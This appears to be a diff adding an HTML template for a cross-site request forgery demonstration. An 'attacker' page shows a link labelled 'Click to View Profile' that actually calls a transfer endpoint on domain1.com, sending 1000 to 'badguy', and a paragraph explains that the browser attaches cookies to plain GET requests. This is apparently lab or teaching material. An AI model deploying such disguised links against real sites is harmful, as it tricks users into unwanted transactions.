@@ -1,0 +1,17 @@
+{{define "clickme"}}<!DOCTYPE html>
+<html>
+<body>
+
+<h2>Hello from Attacker!</h2>
+
+<a href="http://domain1.com:1323/api/transfer?to=badguy&amount=1000">Click to View Profile</a>
+
+<p>
+    For normal GET request, browser will not validate anything.<br>
+    If cookie is there, it will attach to the request.
+</p>
+
+
+</body>
+</html>
+{{end}}
